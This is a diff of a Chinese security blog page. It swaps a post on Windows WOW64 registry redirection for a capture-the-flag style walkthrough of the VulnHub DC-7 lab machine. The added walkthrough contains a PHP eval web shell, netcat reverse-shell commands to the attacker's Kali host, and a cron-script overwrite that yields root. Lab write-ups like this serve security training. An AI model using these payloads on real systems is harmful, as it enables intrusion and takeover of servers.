@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="注册表重定向, 域名之外">
-    <meta name="description" content="写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。">
+    <meta name="keywords" content="VulnHub仿真靶机渗透之DC-7 【DC系列】, 域名之外">
+    <meta name="description" content="这次渗透是DC系列（VulnHub的仿真靶机）的DC-7，包含了Drupal利用drush重置网站管理员密码、一句话木马Getshell、定时任务提权等知识。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>注册表重定向 | 域名之外</title>
+    <title>VulnHub仿真靶机渗透之DC-7 【DC系列】 | 域名之外</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -320,12 +320,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">注册表重定向</h1>
+                    <h1 class="description center-align post-title">VulnHub仿真靶机渗透之DC-7 【DC系列】</h1>
                 </div>
             </div>
         </div>
@@ -349,8 +349,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                <span class="chip bg-color">合规基线相关</span>
+                            <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">DC系列靶机</span>
                             </a>
                         
                     </div>
@@ -361,8 +361,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF/" class="post-category">
-                                合规基线
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                仿真靶机渗透
                             </a>
                         
                     </div>
@@ -374,7 +374,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-07-19
+                    2022-03-15
                 </div>
                 
 
@@ -395,45 +395,128 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>写合规基线规则会遇到注册表匹配不上的问题，这里就涉及到了注册表重定向。</p>
+                <p>这次渗透是DC系列（VulnHub的仿真靶机）的DC-7，包含了Drupal利用drush重置网站管理员密码、一句话木马Getshell、定时任务提权等知识。</p>
 <span id="more"></span>
-<h1 id="重定向技术😊"><a href="#重定向技术😊" class="headerlink" title="重定向技术😊"></a>重定向技术😊</h1><h4 id="重定向技术适用版本："><a href="#重定向技术适用版本：" class="headerlink" title="重定向技术适用版本："></a>重定向技术适用版本：</h4><p>Windows XP X64、Windows Server 2003 X64及以后的X64版本。</p>
-<h4 id="重定向技术产生原因：为了确保32位程序能够顺利运行"><a href="#重定向技术产生原因：为了确保32位程序能够顺利运行" class="headerlink" title="重定向技术产生原因：为了确保32位程序能够顺利运行"></a>重定向技术产生原因：为了确保32位程序能够顺利运行</h4><p>为了将32位程序和64位程序分离开，产生了一种模拟器（WOW64，Windows 32 on Windows 64），WOW64 模拟器让我们可以在64位平台上运行32位程序，它在系统层中另外提供了一层，来支持老式的32位程序。</p>
-<h3 id="一：重定向-文件重定向"><a href="#一：重定向-文件重定向" class="headerlink" title="一：重定向-文件重定向"></a>一：重定向-文件重定向</h3><p>ps: 这种文件重定向对于每个32位应用程序默认打开的，但是也可以通过调用API关闭</p>
-<h4 id="文件重定向原因：为了确保32位程序能够顺利运行"><a href="#文件重定向原因：为了确保32位程序能够顺利运行" class="headerlink" title="文件重定向原因：为了确保32位程序能够顺利运行"></a>文件重定向原因：为了确保32位程序能够顺利运行</h4><p>windows对32位应用程序和64位应用程序有分开存放机制：</p>
-<p>对于64位，文件通常被放在%windir%\system32                和              %ProgramFiles%</p>
-<p>————-&gt;               C:\Windows\system32                           和                C:\program files。</p>
-<p>对于32位，文件通常被放在%windir%\syswow64                和              %ProgramFiles(x86)</p>
-<p>————-&gt;               C:\Windows\syswow64                          和              C:\program files (x86)。</p>
-<p>system32目录下都是64位的dll，只能支持64位程序使用，32位程序不能使用。而syswow64目录下都是32位的dll，可以支持32位程序使用。</p>
-<h4 id="文件重定向产生场景："><a href="#文件重定向产生场景：" class="headerlink" title="文件重定向产生场景："></a>文件重定向产生场景：</h4><p>32位程序访问%windir%\system32   或者  %ProgramFiles%   时候，会发生文件重定向。</p>
-<h4 id="文件重定向具体指向："><a href="#文件重定向具体指向：" class="headerlink" title="文件重定向具体指向："></a>文件重定向具体指向：</h4><p>%windir%\system32                      到                     %windir%\syswow64的重定向。</p>
-<p>%ProgramFiles%                           到                        C:\Program Files (x86)</p>
-<h4 id="文件重定向具体含义："><a href="#文件重定向具体含义：" class="headerlink" title="文件重定向具体含义："></a>文件重定向具体含义：</h4><p>32位应用程序去访问%windir%\system32，系统会自动跳转到%windir%\syswow64目录下面，syswow64目录下都是32位程序的dll，才能够让32位程序顺利加载【system32目录下面的64位dll不能让32位程序使用】。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719173156334.png" alt="image-20220719173156334"></p>
-<h3 id="二：重定向-注册表重定向"><a href="#二：重定向-注册表重定向" class="headerlink" title="二：重定向-注册表重定向"></a>二：重定向-注册表重定向</h3><p>64位Windows的注册表分为 32 位注册表项和 64 位注册表项，许多 32 位注册表项与其相应的 64 位注册表项同名。<br>64 位版本的注册表编辑器中，32 位注册表项显示在 <code>HKEY_LOCAL_MACHINE\Software\WOW6432Node</code> 注册表项下。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719175758828.png" alt="image-20220719175758828"></p>
-<p>打开64位注册表【运行-&gt;regedit】</p>
-<p>打开32位注册表【运行-&gt;%systemroot%\syswow64\regedit】</p>
-<h4 id="注册表重定向产生原因：防止注册表键冲突"><a href="#注册表重定向产生原因：防止注册表键冲突" class="headerlink" title="注册表重定向产生原因：防止注册表键冲突"></a>注册表重定向产生原因：防止注册表键冲突</h4><h4 id="注册表重定向实质：维护两套不同的注册表键【64位和32位】"><a href="#注册表重定向实质：维护两套不同的注册表键【64位和32位】" class="headerlink" title="注册表重定向实质：维护两套不同的注册表键【64位和32位】"></a>注册表重定向实质：维护两套不同的注册表键【64位和32位】</h4><p>ps：</p>
-<p><strong>注册表反射</strong>：【适用版本：windows xp、windows server2003等，从win7和winserver 2008 r2开始WOW64就不使用反射机制了，以前通过反射改的key都改为共享了】        维护两套不同的注册表重定向很多是通过：注册表反射机制完成的，但是不是所有的键值都会受到反射机制影响。</p>
-<p>​                      注册表反射是在64 位注册表视图和 32 位注册表视图之间<strong>复制</strong>某些特定的注册表项和项值。</p>
-<h4 id="注册表分类："><a href="#注册表分类：" class="headerlink" title="注册表分类："></a>注册表分类：</h4><p>1：专门给64位程序访问  【除了32位的都是】</p>
-<p>2：专门给32位程序访问  【HKEY_LOCAL_MACHINE\Software\WOW6432Node 路径下的】</p>
-<h4 id="注册表重定向具体举例："><a href="#注册表重定向具体举例：" class="headerlink" title="注册表重定向具体举例："></a>注册表重定向具体举例：</h4><p>应用程序操作注册表的时候32bit方式和64bit方式。运行于64bit系统下的32bit应用程序默认操作32位注册表项（即被重定向到WOW6432Node下的子项）；而64bit应用程序才是操作的直观子项。</p>
-<p>比如，同在64bit系统下，使用如下代码访问注册表：</p>
-<p>​    ::RegOpenKeyEx(HKEY_LOCAL_MACHINE,_T(“Software\Sobey\MPC “), 0,KEY_ALL_ACCESS, &amp;hKey)</p>
-<p>​    如果应用程序为32位子系统，那么实际访问的注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Sobey\MPC；</p>
-<p>​    而如果应用程序为64位子系统，那么实际访问的注册表位置将会是：HKEY_LOCAL_MACHINE\SOFTWARE\Sobey\MPC。</p>
-<p>下面这个可以看到注册表具体项是哪个是反射、重定向还是共享，非常有用。</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winprog64/shared-registry-keys">WOW 下的重定向、共享和反射项 </a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20220719183751494.png" alt="image-20220719183751494"></p>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/deployment/view-system-registry-with-64-bit-windows">64位视图注册表</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/diaomo9737/article/details/101724390?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0-101724390-blog-40922361.pc_relevant_multi_platform_whitelistv1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">Windows:32位程序运行在64位系统上注册表会重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/jiangqin115/article/details/40922361">jiangqin115  - 注册表重定向</a></p>
-<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/mmthr/article/details/53932154">mmthr  -  32位程序访问64位  system32文件夹时注意事项</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/crazy_liyang/article/details/68302170">Crzayliyang-架构Young，64位Windows系统注册表的 32 位注册表项和64 位注册表项</a></p>
+<h1 id="VulnHub靶机渗透之DC-7-【DC系列】"><a href="#VulnHub靶机渗透之DC-7-【DC系列】" class="headerlink" title="VulnHub靶机渗透之DC-7 【DC系列】"></a>VulnHub靶机渗透之DC-7 【DC系列】</h1><p>dc7靶机下载链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-7,356/">https://www.vulnhub.com/entry/dc-7,356/</a></p>
+<p>运行系统：kali+ dc-7</p>
+<p>平台：vmware workstation</p>
+<p>网络：均使用nat</p>
+<p>任务：拿到root权限，找到flag</p>
+<p>提示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647339782050.png" alt="1647339782050"></p>
+<h4 id="主机发现-dc7靶机192-168-124-137"><a href="#主机发现-dc7靶机192-168-124-137" class="headerlink" title="主机发现 -&gt;dc7靶机192.168.124.137"></a>主机发现 -&gt;dc7靶机192.168.124.137</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647326715697.png" alt="1647326715697"></p>
+<h4 id="nmap完整扫描：22、80端口开放"><a href="#nmap完整扫描：22、80端口开放" class="headerlink" title="nmap完整扫描：22、80端口开放"></a>nmap完整扫描：22、80端口开放</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 192.168.124.137 -p1-65535</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647326963755.png" alt="1647326963755"></p>
+<p>看了看robots.txt，没啥可以利用的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647339133261.png" alt="1647339133261"></p>
+<p>把上次hosts文件里面写的删掉，因为这个靶机的url也是<a target="_blank" rel="noopener" href="http://wordy,就冲突了./">http://wordy，就冲突了。</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647330143470.png" alt="1647330143470"></p>
+<p>是个Drupal的cms，还泄露了作者姓名。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647330480176.png" alt="1647330480176"></p>
+<p>exploitdb搜索一下drupal8的漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647339235348.png" alt="1647339235348"></p>
+<p>挨个试了一下都不行。</p>
+<h4 id="网站作者入手-DC7USER"><a href="#网站作者入手-DC7USER" class="headerlink" title="网站作者入手 @DC7USER"></a>网站作者入手 @DC7USER</h4><p>想到作者在下载页面提示过我们说这个靶机的重点不在盒子里，是在盒子外面，</p>
+<p>而版权作者是DC7USER，那么会不会跟这个有关呢？</p>
+<p>百度搜索一下 @DC7USER，点进他写的项目查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647335603963.png" alt="1647335603963"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647331098848.png" alt="1647331098848"></p>
+<p>确实是给我们留下的暗示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647331113848.png" alt="1647331113848"></p>
+<h4 id="ssh账号密码信息泄露"><a href="#ssh账号密码信息泄露" class="headerlink" title="ssh账号密码信息泄露"></a>ssh账号密码信息泄露</h4><p>看看配置文件，发现了用户和密码。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647331141658.png" alt="1647331141658"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$servername = &quot;localhost&quot;;</span><br><span class="line">	$username = &quot;dc7user&quot;;</span><br><span class="line">	$password = &quot;MdR3xOgB7#dW&quot;;</span><br><span class="line">	$dbname = &quot;Staff&quot;;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>web网页登录失败了，但是22ssh端口开放着的，用这个账户和密码尝试一下ssh登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647331365952.png" alt="1647331365952"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647332332536.png" alt="1647332332536"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh dc7user@192.168.124.137 </span><br></pre></td></tr></table></figure>
+
+<h4 id="提示从mail入手，找到定时任务"><a href="#提示从mail入手，找到定时任务" class="headerlink" title="提示从mail入手，找到定时任务"></a>提示从mail入手，找到定时任务</h4><p>搜了一下mail</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name mail 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647332817115.png" alt="1647332817115"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647333365863.png" alt="1647333365863"></p>
+<p>是个定时任务 cron</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647334156407.png" alt="1647334156407"></p>
+<p>在邮件中查看到<code>/opt/scripts/backups.sh</code>脚本文件，而且仔细观察可以发现邮件是间隔15min发一次的，也就是说backups.sh脚本文件15min分钟运行一次。</p>
+<p>查看一下该shell脚本的权限，可以看到backups.sh脚本文件以root和www-data运行在同一组中，可以全权限执行。【只能 <code>root</code> 用户和 <code>www-data</code> 写入】</p>
+<p>【以www-data权限可以对backups.sh脚本进行操作，如果向backups.sh脚本写入恶意代码，当backups.sh脚本以root身份运行时我们就可以得到root权限。】</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647334528476.png" alt="1647334528476"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:/opt/scripts$ ls -l /opt/scripts/backups.sh</span><br><span class="line">-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</span><br><span class="line">是个普通文件、文件拥有者root的的权限是读、写、执行、文件所属组拥有的权限是读、写、执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">文件属性字段总共有10个字母组成；第一个字符代表文件的类型。</span><br><span class="line">字母“-”表示该文件是一个普通文件</span><br><span class="line">字母“d”表示该文件是一个目录，字母&quot;d&quot;，是dirtectory(目录)的缩写</span><br><span class="line">注意：目录或者是特殊文件，这个特殊文件存放其他文件或目录的相关信息</span><br><span class="line">字母“l”表示该文件是一个链接文件。字母&quot;l&quot;是link(链接)的缩写，类似于windows下的快捷方式</span><br><span class="line">字母“b”的表示块设备文件(block)，一般置于/dev目录下，设备文件是普通文件和程序访问硬件设备的入口，是很特殊的文件。没有文件大小，只有一个主设备号和一个辅设备号。一次传输数据为一整块的被称为块设备，如硬盘、光盘等。最小数据传输单位为一个数据块(通常一个数据块的大小为512字节)</span><br><span class="line">字母为“c”表示该文件是一个字符设备文件(character)，一般置于/dev目录下，一次传输一个字节的设备被称为字符设备，如键盘、字符终端等，传输数据的最小单位为一个字节。</span><br><span class="line">字母为“p”表示该文件为命令管道文件。与shell编程有关的文件。</span><br><span class="line">字母“s”表示该文件为sock文件。与shell编程有关的文件。</span><br><span class="line"></span><br><span class="line">第1字符的后面9个字母表示该文件或目录的权限位。</span><br><span class="line">r表是读 (Read) 、w表示写 (Write) 、x表示执行 (eXecute)</span><br><span class="line">其中前三个表示文件拥有者的权限，中间三个表示文件所属组拥有的权限，最后三个表示其他用户拥有的权限。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看计划任务，写入反弹shell,发现没有权限【这个图找的别人博客的】</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647336548458.png" alt="1647336548458"></p>
+<p>具体看看&#x2F;opt&#x2F;scripts&#x2F;backups.sh脚本内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647334237331.png" alt="1647334237331"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="【drupal默认存在admin用户】定时任务中发现网站存在drush，可以重置admin用户密码"><a href="#【drupal默认存在admin用户】定时任务中发现网站存在drush，可以重置admin用户密码" class="headerlink" title="【drupal默认存在admin用户】定时任务中发现网站存在drush，可以重置admin用户密码"></a>【drupal默认存在admin用户】定时任务中发现网站存在drush，可以重置admin用户密码</h4><p>里面有个drush命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br></pre></td></tr></table></figure>
+
+<p>drush是一个管理drupal网站的命令行工具。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647335153881.png" alt="1647335153881"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647335381803.png" alt="1647335381803"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647335530275.png" alt="1647335530275"></p>
+<p>drush命令可以修改用户密码，而drupalCMS默认存在admin账户，我们可以通过drush修改admin账户的密码，进而登录网站。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">drush user-password  admin --password=123456</span><br></pre></td></tr></table></figure>
+
+<h4 id="修改密码后，admin登录网站成功，首页写入php的一句话木马"><a href="#修改密码后，admin登录网站成功，首页写入php的一句话木马" class="headerlink" title="修改密码后，admin登录网站成功，首页写入php的一句话木马"></a>修改密码后，admin登录网站成功，首页写入php的一句话木马</h4><p>admin&#x2F;123456登录成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647336262019.png" alt="1647336262019"></p>
+<p>在Content—&gt;Add content–&gt;Basic page下可以创建文件，原本准备添加PHP代码反弹shell，但发现Drupal 8不支持PHP代码，百度后知道Drupal 8后为了安全，需要将php单独作为一个模块导入，我们可以下载插件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647336688269.png" alt="1647336688269"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647336642762.png" alt="1647336642762"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337010009.png" alt="1647337010009"></p>
+<p><a target="_blank" rel="noopener" href="https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz">https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337083156.png" alt="1647337083156"></p>
+<p>安装成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337126730.png" alt="1647337042050"></p>
+<p>安装后激活模块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337212399.png" alt="1647337212399"></p>
+<p>安装成功，php可以写了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337238057.png" alt="1647337238057"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337287061.png" alt="1647337287061"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_REQUEST[shell]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337371017.png" alt="1647337371017"></p>
+<p>emm，没找到创建的文件的路径。还是写到首页吧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337544799.png" alt="1647337544799"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337767786.png" alt="1647337767786"></p>
+<p>蚁剑连接成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337816281.png" alt="1647337816281"></p>
+<h4 id="反弹www-data的shell"><a href="#反弹www-data的shell" class="headerlink" title="反弹www-data的shell"></a>反弹www-data的shell</h4><p>kali监听1234端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647337980609.png" alt="1647337980609"></p>
+<p>反弹shell到kali</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.124.134 1234 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647338022664.png" alt="1647338022664"></p>
+<p>使用python进入完全交互的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647338125195.png" alt="1647338125195"></p>
+<h4 id="定时任务写入，反弹root用户的的shell"><a href="#定时任务写入，反弹root用户的的shell" class="headerlink" title="定时任务写入，反弹root用户的的shell"></a>定时任务写入，反弹root用户的的shell</h4><p>当前用户是www-data，在&#x2F;opt&#x2F;scripts目录下的backups.sh脚本文件所属组是www-data，所以www-data用户可以对这个脚本文件进行操作，并且这个脚本文件定时执行可以利用它来反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;nc 192.168.124.134 6666 -e /bin/bash&quot; &gt; /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647338422534.png" alt="1647338422534"></p>
+<p>kali监听6666端口，过了一会儿反弹成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647338389641.png" alt="1647338389641"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1647338532951.png" alt="1647338532951"></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>Github泄露网站数据库配置信息导致泄露SSH账号密码<br>Drupal利用drush重置网站管理员密码<br>网站写入php一句话木马Getshell<br>定时任务文件写入恶意代码进行提权</p>
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sjzs5590/article/details/8254527">https://blog.csdn.net/sjzs5590/article/details/8254527</a>  【     linux ls -l 详解 】</p>
+<p>VULNHUB-DC7复现              【星期五实验室 】</p>
+<p>Vulnhub-DC7               【龙蜀安全】 </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43583637/article/details/102809227">https://blog.csdn.net/weixin_43583637/article/details/102809227</a>   【Vulnhub靶机实战——DC-7】</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/SecIN/p/15504606.html">https://www.cnblogs.com/SecIN/p/15504606.html</a>  【[VulnHub-[DC-1-7]-系列通关手册】</p>
 
                 
             </div>
@@ -460,7 +543,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/">http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/</a>
+                    <a href="http://highgerms.github.io/2022/03/15/dc-7/">http://highgerms.github.io/2022/03/15/dc-7/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -498,8 +581,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                    <span class="chip bg-color">合规基线相关</span>
+                                <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">DC系列靶机</span>
                                 </a>
                             
                         </div>
@@ -549,31 +632,30 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/07/25/WIN+R%20%20%E5%AE%9E%E7%94%A8%E5%A4%A7%E6%80%BB%E7%BB%93/">
+                <a href="/2022/03/15/dc-8/">
                     <div class="card-image">
                         
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-8 【DC系列】">
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="WIN+R实用大总结">
-                        
-                        <span class="card-title">WIN+R实用大总结</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-8 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            将Windows的各种快捷键记熟会提高效率，我们cmd命令都运行结束了，有些傻孩子都还在找图形化界面入口。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-8，包含了sql注入、suid-exim4提权等知识。
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-25
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/" class="post-category">
-                                    效率提升技巧
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                    仿真靶机渗透
                                 </a>
                             
                             
@@ -583,8 +665,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/">
-                        <span class="chip bg-color">效率提升技巧</span>
+                    <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">DC系列靶机</span>
                     </a>
                     
                 </div>
@@ -598,18 +680,18 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/15/dc-8/">
+                <a href="/2022/03/15/dc-6/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-8 【DC系列】">
